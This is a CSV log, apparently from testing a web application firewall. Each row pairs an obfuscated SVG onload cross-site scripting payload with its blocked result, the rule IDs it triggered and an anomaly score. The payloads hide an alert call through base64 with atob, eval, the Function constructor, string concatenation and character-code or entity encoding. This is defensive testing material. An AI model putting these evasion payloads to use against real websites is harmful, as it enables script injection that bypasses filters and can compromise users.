2617,"<svg onload=""queueMicrotask(function(){var a=atob('YWxlcnQoMSk=');eval(a)})""></svg>",0,1,block,7,"932100,933160,934100,941100,941120,941160,949110","o65,5v217,83 || o66,9v217,83 || o28,11v217,83 || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603587660.003433
2622,"<svg onload=""setTimeout(function(){var a=window.atob('YWxlcnQoMSk=');window.eval(a)},0)""></svg>",0,1,block,6,"933160,934100,941100,941120,941160,949110","o76,11v217,95 || o24,11v217,95 || v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603588242.744068
2623,"<svg onload=""setTimeout(function(){var a=self.atob('YWxlcnQoMSk=');self.eval(a)},0)""></svg>",0,1,block,6,"933160,934100,941100,941120,941160,949110","o72,11v217,91 || o24,11v217,91 || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603588398.424119
2624,"<svg onload=""setTimeout(function(){var a=top.atob('YWxlcnQoMSk=');top.eval(a)},0)""></svg>",0,1,block,7,"932105,933160,934100,941100,941120,941160,949110","o65,4v217,89 || o70,11v217,89 || o24,11v217,89 || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603588554.182131
2625,"<svg onload=""setTimeout(function(){var a=parent.atob('YWxlcnQoMSk=');parent.eval(a)},0)""></svg>",0,1,block,6,"933160,934100,941100,941120,941160,949110","o76,11v217,95 || o24,11v217,95 || v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603588678.691304
2626,"<svg onload=""setTimeout(function(){var a=atob('YWxlcnQoMSk=');Function(a)()},0)""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o70,9v217,87t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,87 || v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603588799.653257
2627,"<svg onload=""setTimeout(function(){var a=atob('YWxlcnQoMSk=');[].constructor.constructor(a)()},0)""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o62,35v217,105t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,105 || v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603588840.451757
2628,"<svg onload=""setTimeout(function(){var a=atob('YWxlcnQoMSk=');(1,eval)(a)},0)""></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o24,11v217,85 || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603588972.669318
2629,"<svg onload=""setTimeout(function(){with(atob)var a=call(null,'YWxlcnQoMSk=');eval(a)},0)""></svg>",0,1,block,7,"932100,933160,934100,941100,941120,941160,949110","o76,5v217,96 || o77,11v217,96 || o24,11v217,96 || v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,17760358910.763289
2630,"<svg onload=""setTimeout(function(){var a=atob(`YWxlcnQoMSk=`);eval(a)},0)""></svg>",0,1,block,7,"932100,933160,934100,941100,941120,941160,949110","o61,5v217,81 || o62,11v217,81 || o24,11v217,81 || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603589243.139324
2631,"<svg onload=""setTimeout(function(){var a=String.fromCharCode(...atob('YWxlcnQoMSk=').split('').map(c=>c.charCodeAt()));eval(a)},0)""></svg>",0,1,block,7,"932100,933160,934100,941100,941120,941160,949110","o118,5v217,138 || o119,11v217,138 || o24,11v217,138 || v217,138t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,138t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,138t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603589317.239356
2632,"<svg onload=""setTimeout(function(){var a=decodeURIComponent(escape(atob('YWxlcnQoMSk=')));eval(a)},0)""></svg>",0,1,block,7,"932100,933160,934100,941100,941120,941160,949110","o89,5v217,109 || o90,11v217,109 || o24,11v217,109 || v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603589430.738981
2633,"<svg onload=""setTimeout(function(){var a=atob('YWxlcnQoMSk=');(function(){}).constructor(a)()},0)""></svg>",0,1,block,7,"932100,933210,934100,941100,941120,941160,949110","o61,10v217,105 || o62,35v217,105t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,105 || v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,105t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603589546.019509
2638,"<svg onload=""setTimeout(function(){this[String.fromCharCode(97,108,101,114,116)](9)},0)"">",0,1,block,6,"934100,941100,941120,941160,941370,949110","o24,11v217,89 || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,45v217,89t:urlDecodeUni,t:compressWhitespace || ",25,177603590269.401145
2639,"<svg onload=""setTimeout(function(){window['al'+'ert'](9)},0)"">",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o23,37v217,62t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,62 || o24,11v217,62t:urlDecodeUni || v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,18v217,62t:urlDecodeUni,t:compressWhitespace || ",35,17760359043.985406
2640,"<svg onload=""setTimeout(function(){window[atob('YWxlcnQ')](9)},0)"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o23,42v217,67t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,67 || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,23v217,67t:urlDecodeUni,t:compressWhitespace || ",30,177603590563.048875
2641,"<svg onload=""setTimeout(function(){window['\141\154\145\162\164'](9)},0)"">",0,1,block,6,"934100,941100,941120,941160,941370,949110","o24,11v217,74 || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,30v217,74t:urlDecodeUni,t:compressWhitespace || ",25,177603590736.594143
2647,"<svg onload=""setTimeout(function(){top['a\u006cert'](9)},0)"">",0,1,block,7,"932105,934100,941100,941120,941160,941370,949110","o32,6v217,61 || o24,11v217,61 || v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,17v217,61t:urlDecodeUni,t:compressWhitespace || ",30,177603591545.932197
2648,"<svg onload=""setTimeout(function(){self['&#97;lert'](9)},0)"">",0,1,block,6,"934100,941100,941120,941160,941370,949110","o24,11v217,61 || v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,17v217,61t:urlDecodeUni,t:compressWhitespace || ",25,177603591635.399126
2649,"<svg onload=""setTimeout(function(){parent['ale'+'rt'](9)},0)"">",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o23,37v217,62t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,62 || o24,11v217,62t:urlDecodeUni || v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,17760359176.028006
2650,"<svg onload=""setTimeout(function(){globalThis[String['fromCharCode'](97,108,101,114,116)](9)},0)"">",0,1,block,6,"933210,934100,941100,941120,941160,949110","o23,73v217,98t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,98 || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603591926.170315
2651,"<svg onload=""setTimeout(function(){(window)['a\154ert'](9)},0)"">",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o23,39v217,64t:urlDecode,t:replaceComments,t:compressWhitespace || o24,11v217,64 || v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,19v217,64t:urlDecodeUni,t:compressWhitespace || ",30,177603592071.469906
2668,"<svg onload=""parent['Function']('al'+'ert(1)')()"">",0,1,block,5,"933210,941100,941120,941160,949110","o19,29v216,50t:urlDecode,t:replaceComments,t:compressWhitespace || v216,50t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,50t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,50t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17760359410.239189
2671,"<svg onload=""this.remove();(function(a){return eval(a)}('al\u0065rt(1)'))()""></svg>",0,1,block,8,"932100,933160,933210,934100,941100,941120,941160,949110","o26,10v217,83 || o47,28v217,83 || o27,48v217,83t:urlDecode,t:replaceComments,t:compressWhitespace || o47,5v217,83 || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603594621.450277
2672,"<svg onload=""this.remove();(function(a){return eval(a)}('\u0061lert(1)'))()""></svg>",0,1,block,8,"932100,933160,933210,934100,941100,941120,941160,949110","o26,10v217,83 || o47,28v217,83 || o27,48v217,83t:urlDecode,t:replaceComments,t:compressWhitespace || o47,5v217,83 || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603594760.698559
2673,"<svg onload=""this.remove();(function(a){return eval(a)}('al&#101;rt(1)'))()""></svg>",0,1,block,8,"932100,933160,933210,934100,941100,941120,941160,949110","o26,10v217,83 || o47,28v217,83 || o27,48v217,83t:urlDecode,t:replaceComments,t:compressWhitespace || o47,5v217,83 || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,17760359489.826242
2674,"<svg onload=""this.remove();(function(a){return eval(a)}('&#97;lert(1)'))()""></svg>",0,1,block,8,"932100,933160,933210,934100,941100,941120,941160,949110","o26,10v217,82 || o47,27v217,82 || o27,47v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || o47,5v217,82 || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603594925.701195
2680,"<svg onload=""this.remove();(function(a){return eval(a)}(atob('YWxlcnQoMSk=')))()""></svg>",0,1,block,8,"932100,933160,933210,934100,941100,941120,941160,949110","o26,10v217,88 || o47,33v217,88 || o27,53v217,88t:urlDecode,t:replaceComments,t:compressWhitespace || o47,5v217,88 || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603595784.411890
2681,"<svg onload=""this.remove();(function(a){return eval(a)}(String.fromCharCode(97,108,101,114,116,40,49,41)))()""></svg>",0,1,block,8,"932100,933160,933210,934100,941100,941120,941160,949110","o26,10v217,116 || o47,61v217,116 || o27,81v217,116t:urlDecode,t:replaceComments,t:compressWhitespace || o47,5v217,116 || v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603595857.887297
2682,"<svg onload=""this.remove();(function(a){return eval(a)}('al'+'ert'+'(1)'))()""></svg>",0,1,block,9,"932100,933160,933210,934100,934100,941100,941120,941160,949110","o26,10v217,84 || o47,29v217,84 || o27,49v217,84t:urlDecode,t:replaceComments,t:compressWhitespace || o47,5v217,84 || o47,5v217,84t:urlDecodeUni || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177603595940.459685
2683,"<svg onload=""this.remove();(function(a){return eval(a)}('al'.concat('ert(1)')))()""></svg>",0,1,block,8,"932100,933160,933210,934100,941100,941120,941160,949110","o26,10v217,89 || o47,34v217,89 || o27,54v217,89t:urlDecode,t:replaceComments,t:compressWhitespace || o47,5v217,89 || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177603596061.874596
2684,"<svg onload=""this.remove();(function(a){return eval(a)}(`al`+`ert(1)`))()""></svg>",0,1,block,8,"932100,933160,934100,934100,941100,941120,941160,949110","o26,10v217,81 || o47,26v217,81 || o47,5v217,81 || o47,5v217,81t:urlDecodeUni || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,17760359620.962868
2686,"<svg onload=""this.remove();(function(a){return eval(a)}('al'/**/+'ert(1)'))()""></svg>",0,1,block,9,"932100,933160,933210,934100,934100,941100,941120,941160,949110","o26,10v217,85 || o47,30v217,85 || o27,46v217,85t:urlDecode,t:replaceComments,t:compressWhitespace || o47,5v217,85 || o47,5v217,85t:urlDecodeUni || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177603596450.200013
2688,"<svg onload=""this.remove();(function(a){return eval(a)}('al'+'ert'+String.fromCharCode(40,49,41)))()""></svg>",0,1,block,9,"932100,933160,933210,934100,934100,941100,941120,941160,949110","o26,10v217,108 || o47,53v217,108 || o27,73v217,108t:urlDecode,t:replaceComments,t:compressWhitespace || o47,5v217,108 || o47,5v217,108t:urlDecodeUni || v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177603596728.220302
2690,"<svg onload=""this.remove();(function(a){return window['Function'](a)()})(String.fromCharCode(97,108,101,114,116,40,49,41))""></svg>",0,1,block,8,"932100,933210,934100,941100,941120,941160,941370,949110","o26,10v217,130 || o27,95v217,130t:urlDecode,t:replaceComments,t:compressWhitespace || o73,19v217,130 || v217,130t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,130t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,130t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o47,18v217,130t:urlDecodeUni,t:compressWhitespace || ",35,177603597010.891991
2691,"<svg onload=""this.remove();(new Function('return\x20al'+'ert'))()(1)"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o28,13v217,70 || o28,13v217,70t:urlDecodeUni || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603597195.801750
2692,"<svg onload=""this.remove();(new/**/ Function('return al'+'ert'))()(1)"">",0,1,block,5,"933210,941100,941120,941160,949110","o27,38v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603597253.915590
2693,"<svg onload=""this.remove();(new[Function][0]('return al'+'ert'))()(1)"">",0,1,block,5,"933210,941100,941120,941160,949110","o27,42v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603597363.636880
2694,"<svg onload=""this.remove();(new(Function)('return al'+'ert'))()(1)"">",0,1,block,5,"933210,941100,941120,941160,949110","o27,39v217,68t:urlDecode,t:replaceComments,t:compressWhitespace || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17760359742.556632
2696,"<svg onload=""this.remove();(new Function(atob('cmV0dXJuIGFsZXJ0')))()(1)"">",0,1,block,6,"933210,934100,941100,941120,941160,949110","o27,45v217,74t:urlDecode,t:replaceComments,t:compressWhitespace || o28,13v217,74 || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17760359774.869021
2699,"<svg onload=""this.remove();(new Function(String.fromCharCode(114,101,116,117,114,110,32,97,108,101,114,116)))()(1)"">",0,1,block,5,"934100,941100,941120,941160,949110","o28,13v217,116 || v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603598295.510656
2700,"<svg onload=""this.remove();(new Function('return\tal'+'ert'))()(1)"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o28,13v217,68 || o28,13v217,68t:urlDecodeUni || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603598371.216661
2701,"<svg onload=""this.remove();(new Function(['return al'+'ert'][0]))()(1)"">",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o27,43v217,72t:urlDecode,t:replaceComments,t:compressWhitespace || o28,13v217,72 || o28,13v217,72t:urlDecodeUni || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603598461.001481
2703,"<svg onload=""this.remove();(new Function('retu'+'rn al'+'ert'))()(1)"">",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o27,41v217,70t:urlDecode,t:replaceComments,t:compressWhitespace || o28,13v217,70 || o28,13v217,70t:urlDecodeUni || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177603598743.655301
